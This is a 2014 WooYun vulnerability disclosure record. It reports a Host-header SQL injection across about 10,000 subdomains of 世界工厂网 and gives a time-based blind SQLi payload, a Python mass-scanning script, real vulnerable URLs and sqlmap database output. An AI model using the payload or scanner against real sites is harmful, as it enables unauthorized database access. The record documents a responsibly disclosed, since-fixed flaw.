{"id": 633, "wybug_id": "wooyun-2014-078859", "wybug_title": "世界工厂网1W+用户站点存在SQL注入漏洞", "wybug_corp": "世界工厂网", "wybug_author": "海绵宝宝", "wybug_date": "2014-10-10 17:27", "wybug_open_date": "2014-10-17 11:08", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "9", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-17：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 世界工厂网1W+的分站，存在同一处sql注入.分站采用的是相同的CMS，所以数据量才会比较大. 详细说明：  0x0注入点存在于host头.访问时，用Tamper Data拦截，修改host头,测试语句\nif(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'\"XOR(if(now()=sysdate(),sleep(9),0))OR\"*/ =>\n\n\n\n\n可以判断存在注入.0x1提取存在该漏洞的分站.使用工具找出了1.2W+的分站url，初学python，就写了个python脚本，判断哪些网站存在该漏洞.部分存在漏洞的url供于测试\nhttp://000572.cn.gongchang.comhttp://000700.cn.gongchang.comhttp://000835.cn.gongchang.comhttp://007suv.cn.gongchang.comhttp://020seahog.cn.gongchang.comhttp://020zfc.cn.gongchang.comhttp://021gchjx.cn.gongchang.comhttp://023web.cn.gongchang.comhttp://0242s.cn.gongchang.com\nPython代码\nimport urllib2 import datetimeimport linecachei=1while i<=12820:   #可以自定义从任意行数开始测试\turl=linecache.getline(r'D:\\\\1.txt',i)   #保存分站url的文件位置\ti=i+1\tprint url\trequest = urllib2.Request(url)  \trequest.add_header('Host',\"\"\"if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'\"XOR(if(now()=sysdate(),sleep(3),0))OR\"*/ => \t\"\"\")             #测试使用的poc\ttry:\t\ttime1=datetime.datetime.now()\t\tresponse = urllib2.urlopen(request)\t\texcept urllib2.HTTPError,e:\t\ttime2=datetime.datetime.now()\t\t\ttime3=(time2-time1).seconds\t\tif time3>=3:        #判断测试语句是否成功sleep3秒\t\t\tprint 'ok'      #存在\t\t\td=open('D:\\\\2.txt','a+')  #保存存在漏洞的url位置\t\t\td.write(url)\t\t\t\t\t\telse:\t\t\tprint 'no'\n由于测试语句问题，可能会存在误报.由于url太多，没有全部测试，在1.2W的url中测试了前2000个url，存在漏洞有1990个左右，因此判断在1.2W个url中，大约有1W+都存在该漏洞.   漏洞证明：  0x3用sqlmap跑\n\navailable databases [23]:[*] caijicompany[*] caijiproductinfo[*] catesearch[*] cms[*] empirecms马赛克[*] search[*] test   修复方案：  host头也要做防范吧   版权声明：转载请注明来源 海绵宝宝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-10-10 17:34 厂商回复： 感谢反馈，我们将积极排查并修复 最新状态： 2014-10-17：漏洞已修复  ", "replys": "漏洞评价：\n评论\n     2014-10-24 20:38 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  这也行！！涨知识了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}